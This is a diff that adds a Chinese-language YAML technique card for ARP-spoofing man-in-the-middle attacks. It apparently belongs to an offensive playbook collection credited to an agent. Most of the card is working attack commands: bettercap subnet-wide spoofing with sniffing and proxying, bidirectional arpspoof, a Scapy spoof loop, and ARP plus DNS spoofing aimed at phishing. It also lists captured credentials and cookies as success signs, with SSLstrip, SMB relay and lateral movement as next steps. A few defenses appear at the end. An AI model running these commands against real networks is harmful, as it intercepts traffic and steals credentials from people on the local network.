@@ -1,0 +1,111 @@
+# 技术卡片: ARP 欺骗 - 中间人攻击
+# 分类: network-poisoning / arp / mitm
+# 版本: 1.0
+# 日期: 2026-07-23
+# 来源: poison-ops P3 / bettercap / dsniff
+
+id: "network-poisoning-arp-mitm"
+name: "ARP 欺骗 — 局域网中间人攻击"
+category: "network-poisoning"
+subcategory: "arp-spoofing"
+severity: "high"
+
+description: |
+  通过伪造 ARP 响应包，将攻击者主机伪装为网关（或其他目标主机）。
+  受害者将流量发送到攻击者，攻击者转发到真实网关，
+  实现对局域网流量的透明拦截和篡改。
+
+trigger_signals:
+  - "与目标在同一广播域/网段"
+  - "无 802.1X / DHCP Snooping / DAI 等防护"
+  - "需要捕获明文凭据或篡改内网流量"
+  - "ARP 表可被覆盖（无静态绑定）"
+
+payloads:
+  bettercap_full:
+    - technique: "bettercap 全自动 MITM"
+      payload: |
+        sudo bettercap -eval "
+          net.probe on;
+          set arp.spoof.targets 192.168.1.0/24;
+          set arp.spoof.internal true;
+          arp.spoof on;
+          set net.sniff.verbose true;
+          net.sniff on;
+          http.proxy on
+        "
+
+  arpspoof_bidirectional:
+    - technique: "arpspoof 双向欺骗"
+      payload: |
+        # 启用 IP 转发
+        echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+        # 欺骗受害者（我是网关）
+        sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
+        # 欺骗网关（我是受害者）
+        sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
+
+  scapy_custom:
+    - technique: "Scapy 构造 ARP 欺骗包"
+      payload: |
+        from scapy.all import *
+        send(ARP(op=2, pdst="<victim>", psrc="<gateway>"), loop=1, inter=2)
+      note: "精确控制，适合不稳定网络"
+
+  dns_spoof_combo:
+    - technique: "ARP + DNS 欺骗组合"
+      payload: |
+        bettercap -eval "
+          set dns.spoof.domains *.target.local;
+          set dns.spoof.address 10.0.0.5;
+          arp.spoof on;
+          dns.spoof on
+        "
+      note: "劫持目标域名到攻击机，配合钓鱼或凭据收集"
+
+success_indicators:
+  - "受害者 ARP 表中网关 MAC 变为攻击机 MAC"
+  - "tcpdump 在攻击机上捕获到受害者流量"
+  - "HTTP 明文凭据/会话 Cookie 被捕获"
+  - "DNS 查询返回攻击者指定的 IP"
+
+prerequisites:
+  - "与目标在同一局域网广播域"
+  - "root/sudo 权限（构造原始 ARP 包）"
+  - "IP 转发已启用"
+  - "无 ARP 欺骗防护（DAI/静态 ARP）"
+  - "必须在授权测试范围内"
+
+upgrade_paths:
+  - "HTTP 明文凭据捕获"
+  - "HTTPS 降级攻击（SSLstrip）"
+  - "DNS 劫持 → 钓鱼页面"
+  - "SMB 中继攻击（结合 impacket）"
+  - "横向移动到其他网段主机"
+
+defense:
+  - "交换机启用 DAI (Dynamic ARP Inspection)"
+  - "关键设备配置静态 ARP 绑定"
+  - "802.1X 网络准入控制"
+  - "网络分段/VLAN 隔离"
+
+tools:
+  - "bettercap"
+  - "arpspoof (dsniff)"
+  - "ettercap"
+  - "scapy (Python)"
+  - "tcpdump"
+
+confidence: "high"
+limitations:
+  - "仅在同广播域有效"
+  - "VLAN 隔离阻止跨子网 ARP"
+  - "交换机和 WIFI 客户端隔离可能阻断"
+  - "诱发的 ARP 风暴可能触发 IDS 告警"
+  - "测试后必须恢复 ARP 表"
+
+sources:
+  - agent: "blackmule"
+    date: "2026-07-23"
+  - ref: "bettercap: https://www.bettercap.org/"
+  - ref: "dsniff: https://www.monkey.org/~dugsong/dsniff/"
